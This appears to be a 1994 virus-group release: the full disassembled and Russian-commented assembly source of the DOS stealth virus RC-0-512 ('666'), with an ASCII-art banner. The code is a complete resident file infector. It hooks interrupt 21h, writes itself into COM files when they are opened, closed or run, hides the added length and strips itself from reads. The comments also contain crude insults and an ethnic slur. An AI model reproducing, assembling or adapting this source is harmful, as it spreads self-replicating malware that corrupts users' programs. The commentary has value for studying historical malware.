█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█  ▀					    ▀	       ███▀▀███
█ STEALTH group	█░ █ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▀█▀ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ ▄▀▀  ████▀▄██
█   presents	█░ █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █  ▀█▀▀  █████ ██
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█░ ▐ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄  ███▄▄███
 ░░░░░░░░░░░░░░░░░                                                     DEC 1994
;------------------------------------------------------------------
; Вирус RC-0-512 (в народе 666) весьма отличается от всех других вирусов
;своим оригинальным методом заражения.Все дело в том,что в своих путешествиях
;он использует тупость и даунизм почтенных разработчиков системы MS(PC) DOS.
;Тупость заключается в том,что ПОЧТИ КАЖДЫЙ файл имеет на диске неиспользуемый
;сектор который причисляется к его физической длине и который может служить
;для содержания 512-ти байтного тела вируса,а даунизм здесь в том,что
;разработчики выставили эту голую часть DOS'a на всеобщее обозрение.
; После этого совсем не удивительно,что некий Dark Avenger (далее DAv.)
;воспользовался сией ущербностью для написания вируса,который всем нам
;известный Б.Н.Н. причисляет к Stealth вирусам (т.к. при заражении длина
;файла не увеличивается).
; Ниже представлен оный вирус расхаканый и откоментированый.
; ПРЕДУПРЕЖДАЮ -- что просто изменив пару байт и откомпилировав сей текст
;можно крупно подзалететь т.к. смещения обработчиков прерываний не будут
;сответствовать действительному коду.(Это - чтобы не появились на нашем огороде
;всякие безграмотные штаммы!)
;
;	Расхакивал и коментировал безграмотный технокрыс
;						Light General.
;------------------------------------------------------------------
seg_A     segment byte 'CODE'
	assume cs:seg_A
	org    0100h

;-Начало З.П.------------------------------------------------------

start:
	mov	ah, 030h
	int	021h	   ; DOS - 2+ -	GET DOS	VERSION
	mov	si, 4
	mov	ds, si
	cmp	ah, 01Eh   ;- DOS < 3.30 ?
	lds	ax, [si+8] ;- DS:AX = адр. int_13h
	jb	loc_0_11B  ;-
	mov	ah, 013h
	int	02Fh	   ;- Получаем адрес int_13h
	push	ds	   ; (сей адрес DOS использует в своих
	push	dx	   ;  дисковых операциях).
	int	02Fh	   ;----------------------
	pop	ax
	pop	ds

loc_0_11B:
	mov	di, 0F8h   ;- Суем полученый адрес в конец PSP
	stosw		   ;  т.е. сразу перед вирусом.
	mov	ax, ds
	stosw		   ;-
	mov	ds, si
	lds	ax, [si+040h]   ;- DS:AX = адр. int_21h
	stosw		   ;- И этот адрес спрячем в PSP.

	cmp	ax, 011Bh  ;- Весьма важный момент :
			; коли вирус УЖЕ сидит в памяти
			; то смещение обработчика int_21h = 011Bh.
			; дядюшка DAv. пасет сие значение
			; см.ниже ->
	mov	ax, ds
	stosw
	push	es
	push	di
	jnz	loc_0_139
	shl	si, 1	;<- Проверим полностью ли совпадает копия вируса
	mov	cx, 0100h  ; сидящего в памяти с нашим "оригиналом".
	repe cmpsw	   ; см.ниже ->

loc_0_139:
	push	cs
	pop	ds
	jz	loc_0_187  ;<- Если вирусы "совпадают" то 
			   ; полечим программу и отдадим ей управление.
;- А вот этот участочек будет выполняться если память "чиста".--------
	mov	ah, 052h
	int	021h	   ;- Получим в ES:BX адр. векторной таблицы связи.
	push	es
	mov	si, 0F8h   ;- SI = смещ. в PSP куда мы засунули адр. int_13,21h
	sub	di, di
	les	ax, es:[bx+012h]  ;- ES:AX = адр. 1-го дискового буфера DOS
	mov	dx, es:[di+2]	  ;- DX = смещ. 2-го буфера.
	mov	cx, 0104h	  ;- длина вируса + 8 байт в которых мы сохран.
				  ;  адр. int_13,21h
	repe movsw	;- Переносим тело вируса в 1-й буфер.
	mov	ds, cx  ;- DS = 0000h
	mov	di, 016h
	mov	word ptr [di+06Eh], 011Bh ;- Суем в таблицу прерываний на место
	mov	[di+070h], es ;	адреса int_21h адрес своего "обработчика".
	pop	ds	      ;- DS = Seg. векторн.табл.связи.
	mov	[bx+014h], dx ;- Туда где стоит указатель на 1-й буфер DOS'а
			      ;  ставим указатель на ВТОРОЙ буфер.
			      ;  Теперь DOS будет юзать ТОЛЬКО ОДИН буфер
			      ;  думая,что обращается к 1 и 2.
;- О!А вот теперь начинается еще то извращение :
;  т.к. при нащей инсталляции в память транзитная часть COMMAND.COM'а не
;  затирается - то системе нет надобности его подгружать заново.
;  А сие чревато тем,что у вируса нет повода чтобы ЗАРАЗИТЬ энтот файл.
;  Разрешение проблемы граничит с импотенцией - вирус САМ модифицирует
;  транз.часть так,чтобы DOS подумал будто его затерла загр.программа.
	mov	dx, cs
	mov	ds, dx
	mov	bx, [di-014h]
	dec	bh		; Эта команда имеет код 0FEh 0CFh
				; Байт 0CFh имеет мнемонику IRET!
				; А посему при заражении файлов 
				; на него устанавливается int_24h_entry.
	mov	es, bx
	cmp	dx, [di]
	mov	ds, [di]
	mov	dx, [di]
	dec	dx
	mov	ds, dx
	mov	si, cx
	mov	dx, di
	mov	cl, 028h
	repe movsw
	mov	ds, bx
	jb	loc_0_197
	int	020h	   ; DOS - PROGRAM TERMINATION
;---------------------------------------------------------
;- Выполняется если память УЖЕ инфицирована.
loc_0_187:
	mov	si, cx		;- Возьмем сегментный адр. строк окружения.
	mov	ds, [si+02Ch]   ;-

loc_0_18C:
	lodsw			;- Найдем в оном имя программы из которой
	dec	si		;  вирус "загрузился".
	test	ax, ax
	jnz	loc_0_18C
	add	si, 3
	mov	dx, si

loc_0_197:
	mov	ah, 03Dh	;- Откроем файл "НАШИМ" методом.
	call	sub_0_1B0  ;<--(Для понимания дальнейших поползновений советую
			   ;<-- взглянуть на эту подпрограмму).
	mov	dx, [di]	;- DX = Physical_File_Len.
	mov	[di+4],	dx	;- File pointer = DX.
	add	[di], cx	;- F.p. = Logical_File_len.
	pop	dx
	push	dx
	push	cs
	pop	ds
	push	ds
	pop	es
	push	es
	mov	al, 050h	;- В PSP по этому смещению лежат команды
				;  int 21h ; retf.
	push	ax
	mov	ah, 03Fh	;  А это значит,что положив в стек
				;  Seg_Prog:0100h ; Seg_PSP:0050h ,
				;  и сделав RET Far - мы считываем
				;  оригинальные байты З.П.по адр.Seg_Prog:0100h
				;  и передаем управление Зараженной Программе.
	retf	
;---------------------------------------------------------
;	      S	u b r o	u t i n	e
; Подпрограмма открывает файл (для чтения) и возвращает
; в ES:DI-11h адрес Системной Таблицы Файлов (SFT).
;---------------------------------------------------------
sub_0_1B0	proc  near
	int	021h
	jb	loc_0_1CD
	mov	bx, ax

; External Entry into Subroutine

sub_0_1B6	proc  near
	push	bx
	mov	ax, 01220h
	int	02Fh 	; Multiplex internal - GET SYSTEM FILE TABLE NUMBER
	mov	bl, es:[di]
	mov	ax, 01216h
	int	02Fh 	; Multiplex internal - GET ADDRESS OF SYSTEM FCB
	pop	bx
	push	es
	pop	ds
	add	di, 011h
	mov	cx, 0200h

loc_0_1CD:
	ret	
;---------------------------------------------------------

loc_0_1CE:
	sti	
	call	sub_0_1B6
	mov	bp, cx
	mov	si, [di+4] ;- SI = File pointer.
	pop	cx
	pop	ds
	call	sub_0_20B	;- Прочитаем те байты кторые хотит читать DOS.
	jb	loc_0_204
	cmp	si, bp
	jnb	loc_0_204
	push	ax
	mov	al, es:[di-4] ;- Если 62 секунды (файл заражен) то полечить.
	neg	al
	and	al, 01Fh
	jnz	loc_0_203
	add	si, es:[di]	;- SI = File pointer + File len.
	xchg	si, es:[di+4]
	add	es:[di], bp	;- Logical_File_len = Physical_File_Len.
	call	sub_0_20B	;- Читаем оригинальные байты на место
				;  считаного вируса.
	mov	es:[di+4], si ;- Востанавливаем указатель в файле.
	lahf			;- Сохраним флаги.
	sub	es:[di], bp	;- Востановим длину файла.
	sahf			;- Востановим флаги.

loc_0_203:
	pop	ax

loc_0_204:
	pop	bp
	pop	di
	pop	si
	pop	es
	retf	2	;--- GO TO C.Program.
;---------------------------------------------------------
;	      S	u b r o	u t i n	e
;---------------------------------------------------------
sub_0_20B	proc  near
	mov	ah, 03Fh		; Read.
;- Селектор "незараженного" int_21h.----------------------
sub_0_20D	proc  near
	pushf	
	push	cs
	call	sub_0_236
	ret	

;- Наш обработчик int_21h---------------------------------------

INT_21h_ENTRY:

	push	es
	push	si
	push	di
	push	bp
	push	ds
	push	cx
	cmp	ah, 03Fh	;- Read file.
	jz	loc_0_1CE
	push	ax
	push	bx
	push	dx
	cmp	ah, 03Eh	;- Close file.
	jz	loc_0_23B
	cmp	ax, 04B00h	;- Exec file.
	mov	ah, 03Dh	;- Open file.
	jz	loc_0_23D

loc_0_22D:
	pop	dx
	pop	bx
	pop	ax
	pop	cx
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	es

sub_0_236	proc  near
	jmp	dword ptr cs:4
;---------------------------------------------------------

loc_0_23B:
	mov	ah, 045h	;- Дублировать handle файла.

loc_0_23D:
	call	sub_0_1B0
	jb	loc_0_22D	;- Коли ошибка то выйти.
	sub	ax, ax
	mov	[di+4],	ax 	;- File pointer = Start file = 0000h.
	mov	byte ptr [di-0Fh], 2  ;- Open mode = read/write = 02.
	cld	
	mov	ds, ax
        mov     si, 04Ch ;- Запомним текущий адр.int_13h в стеке.
	lodsw
	push	ax
	lodsw
	push	ax
	push	word ptr [si+040h] ;- Запомним текущий int_24h
	push	word ptr [si+042h] ;
	lds	dx, cs:[si-050h] 
		;- Установим ранее "узнаный" нами вектор int_13h
		;  в таблицу векторов.
		;[ DAv. делает это предполагая,что это BIOS'овский (чистый)
		;  адрес. ]
	mov	ax, 02513h ;
	int	021h	   ; DOS - SET INTERRUPT VECTOR
	push	cs
	pop	ds
	mov	dx, 075h   ;- Посадим на int_24h свой обработчик чтобы DOS
	mov	al, 024h   ;  не кричал 'Write protect ....'
	int	021h	   ; DOS - SET INTERRUPT VECTOR
	push	es
	pop	ds
	mov	al, [di-4]	;- AL = File time.
	and	al, 01Fh	;- File time = 62s?
	cmp	al, 01Fh
	jz	loc_0_280	;- Если в поле секунд стоит "флаг зараженности"
				;  то НЕ ИЗМЕНЯЯ регистр AX перейти дальше.
	mov	ax, [di+017h]  ;- AX = две последние буквы расширения.
	sub	ax, 04F43h     ;  AX = AX - 'OC' т.е. при расш.'COM' ZF=1
	jnz	loc_0_2C4      ;- Если не COM файл то выйти.
loc_0_280:
	xor	[di-4],	al	;- File time = Virus Count = 62s.
	mov	ax, [di]	;- AX = File len.
	cmp	ax, cx		;  Если F.l.<virus_len то выйти.
	jb	loc_0_2C4
	add	ax, cx		;- AX = File len + virus_len
	jb	loc_0_2C4	;  Если результат > 65535 то выйти.
	test	byte ptr [di-0Dh], 4 ;- Если открыт системный файл то выйти.
	jnz	loc_0_2C4
	lds	si, [di-0Ah]	;- DS:SI = указатель на драйвер.
	cmp	[si+4],	ch
	jb	loc_0_2A3
	dec	ax
	shr	ah, 1
	and	ah, [si+4]
	jz	loc_0_2C4

loc_0_2A3:
	mov	ax,0020h	;- Т.к. вирус не имеет в близи себя места
				;  для считывания начальных байтов файла
				;  то используется самая младшая
				;  область памяти машины.
	mov	ds, ax
	sub	dx, dx
	call	sub_0_20B	;- Читаем 512 байтов в память.
	mov	si, dx
	push	cx

loc_0_2B0:
	lodsb			;- Проверяем энти самые считанные байты на
	cmp	al, cs:[si+7]	;  сигнатуру вируса.
	jnz	loc_0_2DE	;  Если полное совпадение то выйти.
	loop	loc_0_2B0	;  Иначе - заразить!
	pop	cx

loc_0_2BA:
	or	byte ptr es:[di-4], 01Fh	;- Востановим дату.

loc_0_2BF:
	or	byte ptr es:[di-0Bh], 040h

loc_0_2C4:
	mov	ah, 03Eh			;- Закроем файл.
	call	sub_0_20D
	or	byte ptr es:[di-0Ch], 040h
	pop	ds
	pop	dx
	mov	ax, 02524h ;- Востановим int_24h.
	int	021h	   ; DOS - SET INTERRUPT VECTOR
	pop	ds
	pop	dx
	mov	al, 013h ;- Востановим int_13h.
	int	021h	   ; DOS - SET INTERRUPT VECTOR
	jmp	loc_0_22D	;---- GO TO EXIT.
;---------------------------------------------------------
;- Будем заражать по сурьезному.--------------------------
loc_0_2DE:
	pop	cx
	mov	si, es:[di]	;- SI = Logical_File_Len.
	mov	es:[di+4], si	;- File pointer = End_File.
	mov	ah, 040h	;- Пишем считаные байты в конец файла.
	int	021h	   ; DOS - 2+ -	WRITE TO FILE WITH HANDLE
	jb	loc_0_2BF
	mov	es:[di], si	;- Logical_File_len = L_F_L - 512
				;  т.е. логическая длина файла которую юзер
				;  видит в Нортоне - в действительности
				;  на 512 байтов меньше физической длины.
	mov	es:[di+4], dx	;- File pointer = Start file = 0000h.
	push	cs
	pop	ds
	mov	dl, 8		;- Пишем тело вируса в начало файла.
	mov	ah, 040h
	int	021h	   ; DOS - 2+ -	WRITE TO FILE WITH HANDLE
	jmp	loc_0_2BA
;---------------------------------------------------------

	db	'666'

seg_A	  ends

;---------------------------------------------------------
	end    start

;(h) 25.10.94. by Light General in Stealth group CoUNTry of fUckraine.